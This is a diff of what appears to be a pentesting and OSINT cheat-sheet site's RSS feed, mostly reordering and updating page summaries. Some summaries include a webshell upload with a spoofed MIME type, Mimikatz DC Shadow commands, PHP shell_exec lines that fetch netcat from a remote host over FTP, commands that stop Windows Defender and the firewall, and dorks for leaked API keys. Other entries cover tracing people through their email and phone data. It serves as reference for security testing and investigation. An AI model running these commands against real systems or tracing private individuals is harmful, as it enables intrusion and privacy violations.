@@ -105,7 +105,7 @@ Broken Links # Check for broken links and domain takeover # For twitter, Twitter
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/platforms-hunting/google/</guid>
-      <description>Linking to Google Account https://subfn.net/2020/06/15/ga-osint-trick/ # Using Google Analytics, you can check if a non-google e-mail address is linked to a Google account # Log into Google Analytics # Navigate to Admin &amp;gt; Account User Management &amp;gt; Add user # At this point, enter an email address. If the email is a backup email of a Google account, the primary Google email (e.g. the Google login email) will be disclosed</description>
+      <description>Linking to Google Account https://medium.com/week-in-osint/keeping-a-grip-on-googleids-506814ae098b https://subfn.net/2020/06/15/ga-osint-trick/ # Using Google Analytics, you can check if a non-google e-mail address is linked to a Google account # Log into Google Analytics # Navigate to Admin &amp;gt; Account User Management &amp;gt; Add user # At this point, enter an email address. If the email is a backup email of a Google account, the primary Google email (e.g. the Google login email) will be disclosed# Automated tool for identifying Google account, getting ID and relations on Google services # Works like a charm (from https://epieos.</description>
     </item>
     
     <item>
@@ -133,7 +133,7 @@ Attack modes -a 0 # Straight : hash dict -a 1 # Combination : hash dict dict -a 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/technical-recon/ip_address/</guid>
-      <description>Getting Informations Whois and ASN # Get information on an IP whois &amp;lt;IP&amp;gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com https://whoisology.com# Get ASN for your target bgp.he.net# You can identify IP block owned by a company ipv4info.com Online Scanners # Shodan.io and Censys.io are also usefull # Keywords on Shodan https://beta.shodan.io/search/filters city:&amp;#34;Grenoble&amp;#34; country:&amp;#34;FR&amp;#34; geo:&amp;#34;21.452673,56.245212&amp;#34; server: &amp;#34;gws&amp;#34; hostname:&amp;#34;google&amp;#34; net:210.214.0.0/16 os:&amp;#34;windows 10&amp;#34; port:22 # https://github.com/jakejarvis/awesome-shodan-queries# Get information about the target IP https://www.onyphe.io/ # Robtex is a great and complete tool https://www.</description>
+      <description>Getting Informations Whois and ASN # Get information on an IP whois &amp;lt;IP&amp;gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com https://whoisology.com# Get ASN for your target bgp.he.net# You can identify IP block owned by a company ipv4info.com Online Scanners # Shodan.io and Censys.io are also usefull # Keywords on Shodan https://beta.shodan.io/search/filters city:&amp;#34;Grenoble&amp;#34; country:&amp;#34;FR&amp;#34; geo:&amp;#34;21.452673,56.245212&amp;#34; server: &amp;#34;gws&amp;#34; hostname:&amp;#34;google&amp;#34; net:210.214.0.0/16 os:&amp;#34;windows 10&amp;#34; port:22 # https://github.com/jakejarvis/awesome-shodan-queries # Using a premium account, you can search by image https://images.</description>
     </item>
     
     <item>
@@ -393,6 +393,16 @@ Exploiting sudo    Binary program Commands Infos     apache2 sudo apache2 -f /et
     </item>
     
     <item>
+      <title>Darkweb Investigation</title>
+      <link>/open-source-intelligence-osint/technical-recon/misc/darkweb_investigation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/misc/darkweb_investigation/</guid>
+      <description>[WIP]
+Search the Darkweb https://medium.com/@darksearch/darksearch-the-1st-real-search-engine-dark-web-darksearch-vs-ahmia-84852fd4c51b https://darksearch.io/https://webhose.io/blog/dark-web/the-top-5-dark-web-search-engines/ # - Candle # - Torch # - Kilos # - AHMIA # - Tor77 # - Darksearch</description>
+    </item>
+    
+    <item>
       <title>Domain &amp; URLs</title>
       <link>/open-source-intelligence-osint/technical-recon/domains_urls/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -452,19 +462,6 @@ Informations Files # Kerberos informations to get enrolled (location of KDCs.</d
       <description>File Upload are well known and kinda old PHP vulnerabilities but can still work some times  
 Double Extension # If the target is only checking extension → exploit.php.jpg 
 MIME Type # Classical, using Burp for example Content-Type: application/x-php → Content-Type: image/gif # Using cURL curl -i -F &amp;#34;file=@shell.php;type=image/gif&amp;#34; --cookie &amp;#34;...&amp;#34; &amp;#34;&amp;lt;target&amp;gt;&amp;#34; # You can also create or update the following registry key on Windows {{HKLM\SOFTWARE\Classes\.php}} # Then create a “String” type registry key and, named “Content-Type&amp;#34; and set the value “image/gif”</description>
-    </item>
-    
-    <item>
-      <title>Firefox addons</title>
-      <link>/open-source-intelligence-osint/tools-and-methodology/firefox_addons/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/tools-and-methodology/firefox_addons/</guid>
-      <description>OSINT Bookmarks https://www.osintcombine.com/osint-bookmarks 
-Flag Fox Flagfox is an extension that displays a flag icon indicating the current webserver&amp;rsquo;s physical location.
-It then launch a geotool webpage to get more informations about the website you are visiting About IP &amp;amp; Domain.
-Google Cache Google Cache lets you visit retrieve the web page from Google Web Cache when the site is offline.
-If the site is offline, you can just press toolbar button and request cached version of the page from Google Cache.</description>
     </item>
     
     <item>
@@ -537,12 +534,12 @@ Blind NoSQL Injection # Get size index.php ?chall_name=nosqlblind&amp;amp;flag[$
     
     <item>
       <title>OPSEC</title>
-      <link>/open-source-intelligence-osint/technical-recon/misc/opsec/</link>
+      <link>/open-source-intelligence-osint/tools-and-methodology/opsec/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/misc/opsec/</guid>
+      <guid>/open-source-intelligence-osint/tools-and-methodology/opsec/</guid>
       <description>[WIP]
-Technical OPSEC https://amiunique.org/fp https://twitter.com/OSINTgeek/status/1258857825868156930?s=19 https://www.artbreeder.com/ https://www.privacytools.io/providers/email/ 
+Technical OPSEC # Simple data analysis (headers, OS...) https://amiunique.org/fp # Creating profile pictures for sock # Mixing two pictures https://twitter.com/OSINTgeek/status/1258857825868156930?s=19 https://www.artbreeder.com/ # Email providers comparison https://www.privacytools.io/providers/email/ # Compilation of great ressources https://shutuptrackers.com/index.php # Windows 10 Tracking https://github.com/10se1ucgo/DisableWinTracking 
 Human Related OPSEC # Image Cloaking for Personal Privacy # Fawkes takes your personal images and makes tiny, pixel-level changes that are invisible to the human eye # if and when someone tries to use these photos to build a facial recognition model # &amp;#34;cloaked&amp;#34; images will teach the model an highly distorted version of what makes you look like you http://sandlab.</description>
     </item>
     
@@ -669,16 +666,6 @@ Enumeration # using smtp-user-enum script smtp-user-enum -M VRFY -U users.txt -t
     </item>
     
     <item>
-      <title>Buscador</title>
-      <link>/open-source-intelligence-osint/tools-and-methodology/buscador/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/tools-and-methodology/buscador/</guid>
-      <description>Tools Custom Firefox Browser &amp;amp; Add-Ons Custom Chrome Browser &amp;amp; Extensions Tor Browser Custom Video Manipulation Utilities Custom Video Download Utility Amass BleachBit EmailHarvester ExifTool EyeWitness Ghiro GIMP Google Earth Pro HTTrack Cloner InstaLooter KeePassXC Kleopatra Knock Pages LibreOffice LinkedInt Maltego	Metagoofil MediaInfo Metadata Anonymisation Toolkit PhoneInfoga Photon ReconDog Recon-NG SkipTracer SocialMapper Spiderfoot StegoSuite SubBrute Sublist3r theHarvester Tinfoleak Twint Twitter Exporter VeraCrypt VLC Yubico Utilities 
-Tools descriptions # Firefox and some plugins - Download Star - ExifViewer - Firefox multiaccount - HTTPS Everywhere - Image Search Options - MJsonViewer - Nimbus Screen Capture - Resurrect Pages - Take Webpage Screenshots Entirely - uBlock Origin - User-Agent Switcher - Video DownloadHelper # Google Chrome with other plugins # TOR Browser # Custom Video Manipulation Utilities # Custom Video Download Utility # Amass → DNS Enumeration → Network Mapping # BleachBit → Clean your PC # EmailHarvester → Collect emails using search engines # Exiftool → Extract metadata from images # EyeWitness → Take screenshots from website → Get HTTP headers → Identify some credentials → Basic tool semi passive # Ghiro → Ghiro is a fully automated tool designed to run forensics analysis over a massive amount of images → Just using an user friendly and fancy web application.</description>
-    </item>
-    
-    <item>
       <title>CrackMapExec</title>
       <link>/windows-systems/exploitation/crackmapexec/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -709,22 +696,21 @@ PwnedOrNot https://github.com/thewhiteh4t/pwnedOrNot.git # Simple python tool us
     </item>
     
     <item>
+      <title>Cryptocurrency Investigation</title>
+      <link>/open-source-intelligence-osint/technical-recon/misc/cryptocurrency_investigation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/misc/cryptocurrency_investigation/</guid>
+      <description>Orbit - Cryto Wallet Analysis # Give it a blockchain based crypto wallet address and it will crawl 3 levels deep in transaction data to plot a graph out of the information. python3 orbit.py # Next thing is to plot a graph for which we will be using quark framework # Then use the html output python quark.py /path/to/file.json</description>
+    </item>
+    
+    <item>
       <title>DC Shadow</title>
       <link>/windows-systems/post-exploitation-techniques/dc_shadow/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/post-exploitation-techniques/dc_shadow/</guid>
       <description># DC Shadow is a post compromission attack, allowing you to update replication metadata # On a compromised client, using a domain admin account # You can attack with Mimikatz# Terminal 1 (runas) mimikatz # !+ mimikatz # !processtoken mimikatz # lsadump::dcshadow /object:dtargaryen /attribute:description /value:&amp;#34;The Game&amp;#34; /replOriginatingUid:{00000000-0000-0000-0000-000000000000} /replOriginatingTime:&amp;#34;2017-01-01 09:00:00&amp;#34; /replOriginatingUsn:42# Terminal 2 (runas) mimikatz # lsadump::dcshadow /push# You can check the success throught repadmin on the DC repadmin /showobjmeta DC01.NORZH.LAN &amp;#34;CN=Daenerys Targaryen,CN=Users,DC=NORZH,DC=LAN&amp;#34;</description>
-    </item>
-    
-    <item>
-      <title>Darkweb Investigation</title>
-      <link>/open-source-intelligence-osint/technical-recon/misc/darkweb_investigation/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/misc/darkweb_investigation/</guid>
-      <description>[WIP]
-Search the Darkweb https://medium.com/@darksearch/darksearch-the-1st-real-search-engine-dark-web-darksearch-vs-ahmia-84852fd4c51b https://darksearch.io/https://webhose.io/blog/dark-web/the-top-5-dark-web-search-engines/ # - Candle # - Torch # - Kilos # - AHMIA # - Tor77 # - Darksearch</description>
     </item>
     
     <item>
@@ -755,6 +741,19 @@ Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt
       <guid>/linux-systems/file_transfer/</guid>
       <description>NFS # You can remotely mount NFS volumes mount -t nfs xx.xx.xx.xx:/ /tmp/a 
 Linux FTP #!/bin/sh  ftp -n IP &amp;lt;&amp;lt;END_SCRIPT quote USER acknak quote PASS jLQRZy4gyLhmMqz2whTw binary GET file.py quit END_SCRIPT exit 0 # Can also be done over php: &amp;lt;?php echo shell_exec(&amp;#34;echo open 192.168.42.102 21&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo user acknak jLQRZy4gyLhmMqz2whTw&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo binary&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo get netcat /usr/local/databases/netcat&amp;gt;&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo bye&amp;gt;&amp;gt; /usr/local/databases/ftp.</description>
+    </item>
+    
+    <item>
+      <title>Firefox addons</title>
+      <link>/open-source-intelligence-osint/tools-and-methodology/firefox_addons/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/tools-and-methodology/firefox_addons/</guid>
+      <description>OSINT Bookmarks https://www.osintcombine.com/osint-bookmarks 
+Flag Fox Flagfox is an extension that displays a flag icon indicating the current webserver&amp;rsquo;s physical location.
+It then launch a geotool webpage to get more informations about the website you are visiting About IP &amp;amp; Domain.
+Google Cache Google Cache lets you visit retrieve the web page from Google Web Cache when the site is offline.
+If the site is offline, you can just press toolbar button and request cached version of the page from Google Cache.</description>
     </item>
     
     <item>
@@ -949,12 +948,13 @@ Active Directory DNS # Zone Transfer using dig # Find AD-DS through DNS # Global
     </item>
     
     <item>
-      <title>Cryptocurrency Investigation</title>
-      <link>/open-source-intelligence-osint/technical-recon/misc/cryptocurrency_investigation/</link>
+      <title>Buscador</title>
+      <link>/open-source-intelligence-osint/tools-and-methodology/buscador/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/misc/cryptocurrency_investigation/</guid>
-      <description>Orbit - Cryto Wallet Analysis # Give it a blockchain based crypto wallet address and it will crawl 3 levels deep in transaction data to plot a graph out of the information. python3 orbit.py # Next thing is to plot a graph for which we will be using quark framework # Then use the html output python quark.py /path/to/file.json</description>
+      <guid>/open-source-intelligence-osint/tools-and-methodology/buscador/</guid>
+      <description>Tools Custom Firefox Browser &amp;amp; Add-Ons Custom Chrome Browser &amp;amp; Extensions Tor Browser Custom Video Manipulation Utilities Custom Video Download Utility Amass BleachBit EmailHarvester ExifTool EyeWitness Ghiro GIMP Google Earth Pro HTTrack Cloner InstaLooter KeePassXC Kleopatra Knock Pages LibreOffice LinkedInt Maltego	Metagoofil MediaInfo Metadata Anonymisation Toolkit PhoneInfoga Photon ReconDog Recon-NG SkipTracer SocialMapper Spiderfoot StegoSuite SubBrute Sublist3r theHarvester Tinfoleak Twint Twitter Exporter VeraCrypt VLC Yubico Utilities 
+Tools descriptions # Firefox and some plugins - Download Star - ExifViewer - Firefox multiaccount - HTTPS Everywhere - Image Search Options - MJsonViewer - Nimbus Screen Capture - Resurrect Pages - Take Webpage Screenshots Entirely - uBlock Origin - User-Agent Switcher - Video DownloadHelper # Google Chrome with other plugins # TOR Browser # Custom Video Manipulation Utilities # Custom Video Download Utility # Amass → DNS Enumeration → Network Mapping # BleachBit → Clean your PC # EmailHarvester → Collect emails using search engines # Exiftool → Extract metadata from images # EyeWitness → Take screenshots from website → Get HTTP headers → Identify some credentials → Basic tool semi passive # Ghiro → Ghiro is a fully automated tool designed to run forensics analysis over a massive amount of images → Just using an user friendly and fancy web application.</description>
     </item>
     
     <item>
@@ -1023,6 +1023,16 @@ Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz #
       <guid>/web-pentest/content-management-system-cms/magento/</guid>
       <description>Getting Magento Version # Magento has 2 mains branches, Magento 1 and Magento 2# On Magento 2, you can add /magento_version targetsite.com/magento_version# On magento 1, you have another login interface at /dowloader # Versions can be displayed in the footer https://www.example.com/downloader/ https://www.example.com/magento/downloader/# You can find the version by comparing hash file signatures # between several versions and the running one. # That&amp;#39;s what magescan does. https://github.com/steverobbins/magento-version-identification-php 
 Magescan # Online scanner # Usefull and complete, but online https://magescan.</description>
+    </item>
+    
+    <item>
+      <title>Others</title>
+      <link>/open-source-intelligence-osint/technical-recon/misc/others/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/misc/others/</guid>
+      <description>Secrets &amp;amp; Default Passwords # Looking for passwors, API keys etc # Check Online IDES site:http://ideone.com &amp;#34;apikey&amp;#34; site:http://ideone.com &amp;#34;aws_access_key_id&amp;#34;# Default passwords https://www.routerpasswords.com/ https://cirt.net/passwords https://default-password.info/ http://defaultpassword.us/ http://www.passwordsdatabase.com/ http://open-sez.me/ Code replication # You can find same website piece of code to identify same vendors https://nerdydata.com/search https://searchcode.com/ 
+Forums # Find informations on forums http://boardreader.com https://raidforums.com/</description>
     </item>
     
     <item>
@@ -1223,16 +1233,6 @@ General &amp;amp; Theory # Kerberos is just SSO, it&amp;#39;s like SAML or OpenI
     </item>
     
     <item>
-      <title>Others</title>
-      <link>/open-source-intelligence-osint/technical-recon/misc/others/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/misc/others/</guid>
-      <description>Secrets &amp;amp; Default Passwords # Looking for passwors, API keys etc # Check Online IDES site:http://ideone.com &amp;#34;apikey&amp;#34; site:http://ideone.com &amp;#34;aws_access_key_id&amp;#34;# Default passwords https://www.routerpasswords.com/ https://cirt.net/passwords https://default-password.info/ http://defaultpassword.us/ http://www.passwordsdatabase.com/ http://open-sez.me/ Code replication # You can find same website piece of code to identify same vendors https://nerdydata.com/search https://searchcode.com/ 
-Forums # Find informations on forums http://boardreader.com https://raidforums.com/</description>
-    </item>
-    
-    <item>
       <title>Persistence</title>
       <link>/windows-systems/post-exploitation-techniques/persistence/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -1335,7 +1335,7 @@ NanoCMS # Password and sensitive data leak [url]/data/pagesdata.</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/phone/</guid>
-      <description>Getting informations using a phone number # When you have a phone number, you can use some messaging websites/applications # If the target is registered, it can provides additional informations # /!\ Some applications might tell the target you&amp;#39;ve reached them /!\ https://medium.com/@Ginger_T/how-can-we-use-messenger-apps-in-osint-682cbc634f Facebook Messenger # Profile picture and details from Facebook bio Facetime # If you add a contact on Apple it wil tell you if the target can use Facetime # If so, you know the target is using an Apple Product ICQ # Profile Picture, Nickname, Name, BIO &amp;amp; last seen.</description>
+      <description>Using phone contact book apps https://www.bellingcat.com/resources/how-tos/2019/04/08/using-phone-contact-book-apps-for-digital-research/ # GetContact # Free, need SMS requirement (burner) + email # Banned in some countries but works good # List one possible name # TrueCaller # Free, need Google or Microsoft account # Works good, list one possible name and tags # CallApp # Free, need Google or Microsoft account OR SMS # Works good, lists comments from users about number, gives a # reliability score to number, shows how often the number was searched # Dalily # No requirements, free # Focused only on Arabic-speaking countries # Can search by either name or number, and also will provide all contact book # information (email, etc), not just name and number # Eyecon # Free, SMS requirement # Photograph and one name for the contact # Viewcaller / Showcaller # No requirements, free # Only one name, very basic details</description>
     </item>
     
     <item>
@@ -1576,7 +1576,7 @@ User Interface Header # Import --&amp;gt; Used to import collection or environme
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/windows_defender/</guid>
-      <description># Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command &amp;#34;&amp;amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }&amp;#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable</description>
+      <description>Start/Stop # Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command &amp;#34;&amp;amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }&amp;#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable</description>
     </item>
     
     <item>
